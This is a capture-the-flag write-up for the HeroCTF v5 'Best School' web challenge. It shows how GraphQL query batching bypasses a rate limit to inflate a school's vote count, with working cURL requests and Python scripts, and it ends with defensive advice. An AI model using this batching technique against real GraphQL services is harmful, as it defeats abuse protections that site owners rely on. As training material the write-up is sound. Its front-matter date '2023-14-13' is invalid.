---
title: "[Easy][HeroCTF v5][Web] Best School"
date: "2023-14-13"
categories: [ "CTF", "HeroCTF v5", "Web", "GraphQL" ]
tags: [ "GraphQL", "Rate Limit", "Bypass", "Batching Attack" ]
slug: "best-school"
ShowToc: false
draft: false
weight: 1
---

# HeroCTF v5 Write-Up

## Web

### Easy - Best School

Description:

```
An anonymous company has decided to publish a ranking of the best schools, based on the number of clicks on a button! Make sure to put the 'Flag CyberSecurity School' in first place and you will get your reward!
```

We arrive on a page that displays a list of schools with the number of votes. We can vote for a school by clicking on the `I'm at this school` button next to the school. Clicking this button will increase the school's score by one point, and there is a `rate limit` system in place to prevent spamming the buttons.

Once the 'Flag CyberSecurity School' has more votes than the other schools, we can click the `Get The Flag!` button to obtain the flag.

![Home page](/images/heroctfv5/web/best_school_home.png)

When we vote for a school, a POST request is sent to the application's `GraphQL` API. In the request, we can see that it is a mutation calling the `increaseClickSchool` function with the school name as a parameter.

![Vote request](/images/heroctfv5/web/best_school_vote.png)

The request in cURL format:

```bash
curl 'http://dyn-03.heroctf.fr:10048/graphql' \
  -H 'Content-Type: application/json' \
  --data-raw '{"query":"mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }"}'
```

When the request is not limited by the `rate limit`, we receive a response like this:

```json
{"data":{"increaseClickSchool":{"schoolId":3,"nbClick":4}}}
```

However, when the request is limited, we receive a response like this:

```json
{"code":429,"error":"You're going too fast!"}
```

We can create a script that determines the `rate limit` by making requests to the GraphQL endpoint:

```python
import requests
import time

url = "http://dyn-03.heroctf.fr:10048/graphql"
headers = {"Content-Type": "application/json"}
data = '{"query":"mutation { increaseClickSchool(schoolName: \\"Flag CyberSecurity School\\"){schoolId, nbClick} }"}'

seconds = 0
while True:
    r = requests.post(url, headers=headers, data=data)
    if r.status_code == 200:
        print(r.text)
        print("Seconds elapsed: " + str(seconds))
        seconds = 0
    elif r.status_code == 429:
        print("Rate limit exceeded, waiting 1 second...")
        time.sleep(1)
        seconds += 1
    else:
        print("Error")
        break
```

With this script, we try to increase the score every second and display the number of seconds elapsed between each successful request. We obtain the following result:

```json
{"data":{"increaseClickSchool":{"schoolId":3,"nbClick":4}}}
Rate limit exceeded, waiting 1 second...
...
Rate limit exceeded, waiting 1 second...
{"data":{"increaseClickSchool":{"schoolId":3,"nbClick":5}}}
Seconds elapsed: 59
```

Therefore, we can conclude that the `rate limit` is 60 seconds. Given that the HeroCTF instances have a maximum uptime of 45 minutes, it will be impossible to surpass `The Best Best CyberSecurity School`, which has 1337 votes (the maximum possible votes is 45).

After multiple attempts with introspection queries (which are enabled on the GraphQL API), I realized that I was going in the wrong direction. In fact, there is no flag in the GraphQL API, and what is blocking us is the 60-second `rate limit`.

While delving into the topic of bypassing rate limits, I came across an article from [OWASP](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html#batching-attacks) that explains how to bypass the `rate limit` by performing "Batching Attacks."

> GraphQL supports batching requests, also known as query batching. This lets callers batch multiple queries or batch requests for multiple object instances in a single network call, which allows for what is called a batching attack. This is a form of brute force attack, specific to GraphQL, that usually allows for faster and less detectable exploits. Here is the most common way to do query batching:

```graphql
[
  {
    query: < query 0 >,
    variables: < variables for query 0 >,
  },
  {
    query: < query 1 >,
    variables: < variables for query 1 >,
  },
  {
    query: < query n >
    variables: < variables for query n >,
  }
]
```

Applying this to our case, we can make a request like this:

```graphql
[
  {
    query: "mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }"
  },
  {
    query: "mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }"
  },
  {
    query: "mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }"
  },
  ...
]
```

By sending the following cURL request, we can increase the score by 3 points in a single request:

```bash
curl 'http://dyn-03.heroctf.fr:10048/graphql' \
  -H 'Content-Type: application/json' \
  --data-raw '[ { "query": "mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }" },{ "query": "mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }" },{ "query": "mutation { increaseClickSchool(schoolName: \"Flag CyberSecurity School\"){schoolId, nbClick} }" }]'

[
    {
        "data": {
            "increaseClickSchool": {
                "schoolId": 3,
                "nbClick": 1
            }
        }
    },
    {
        "data": {
            "increaseClickSchool": {
                "schoolId": 3,
                "nbClick": 2
            }
        }
    },
    {
        "data": {
            "increaseClickSchool": {
                "schoolId": 3,
                "nbClick": 3
            }
        }
    }
]
```

Therefore, we can create a script that sends requests of this type to increase the score of the 'Flag CyberSecurity School' up to 1337.

```python
import requests
import time

url = "http://dyn-03.heroctf.fr:10048/graphql"
headers = {"Content-Type": "application/json"}
nbQuerySent = 900
simple_query = '{"query":"mutation { increaseClickSchool(schoolName: \\"Flag CyberSecurity School\\"){schoolId, nbClick} }"}'
data = "[" + (simple_query + ",") * nbQuerySent + simple_query + "]"

nbIncrement = 0
while True:
    r = requests.post(url, headers=headers, data=data)
    if r.status_code == 200:
        print("Added " + str(nbQuerySent) + " clicks to Flag CyberSecurity School")
        nbIncrement += 1
        if nbIncrement * nbQuerySent > 1337:
            print("Flag CyberSecurity School has been clicked " + str(nbQuerySent * nbIncrement) + " times")
            break
    elif r.status_code == 429:
        print("Rate limit exceeded, waiting 1 second...")
        time.sleep(1)
    else:
        print("Error: " + str(r.text))
        break
```

We send packets of 900 requests because exceeding this number would exceed the maximum payload size to be sent.

```
Rate limit exceeded, waiting 1 second...
Added 900 clicks to Flag CyberSecurity School
Rate limit exceeded, waiting 1 second...
...
Rate limit exceeded, waiting 1 second...
Added 900 clicks to Flag CyberSecurity School
Flag CyberSecurity School has been clicked 1800 times
```

Now we can click the `Get The Flag!` button and obtain the flag `Hero{gr4phql_b4tch1ng_t0_byp4ss_r4t3l1m1t!!}`.

![flag](/images/heroctfv5/web/best_school_flag.png)

## Great sources

- [OWASP - GraphQL Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/GraphQL_Cheat_Sheet.html)
- [HackTricks - GraphQL](https://book.hacktricks.xyz/pentesting-web/graphql)

## Tips & Tricks

The GraphQL technology is quite recent, and I hadn't had the opportunity to use it before. So I learned a lot about it through this challenge.

Thanks to this challenge, I'm getting started with GraphQL and only discovering the basics. I also improved my usage of cURL.

### GraphQL - Batch Attacks

Batch attacks are attacks that allow performing multiple requests in a single batch. This bypasses protections like rate limiting and enables faster and less detectable attacks. It is important to be aware of this type of attack when developing a GraphQL API.

One way to protect against batch attacks is by disabling aliases using the [GraphQL No Alias](https://github.com/ivandotv/graphql-no-alias) plugin.

### GraphQL - Data Management

I wasn't aware that GraphQL doesn't have getters/setters. In fact, you can't directly modify object data. Instead, you need to use mutations to modify object data.

If no mutation is provided, you cannot modify object data. This helps protect object data from accidental modifications.

However, you can easily retrieve data using queries.

### GraphQL - Rate Limiting

It is possible to implement rate limiting on a GraphQL API. This helps limit the number of requests a user can make per second. It also provides protection against brute force attacks or attacks that require a large number of requests.

The rate limit can be set based on several criteria:

- By IP address within a given time frame
- By user within a given time frame
- By user and IP address within a given time frame

As of the current date __(May 16, 2023)__, the most common library for implementing rate limiting in GraphQL is [graphql-rate-limit](https://www.npmjs.com/package/graphql-rate-limit).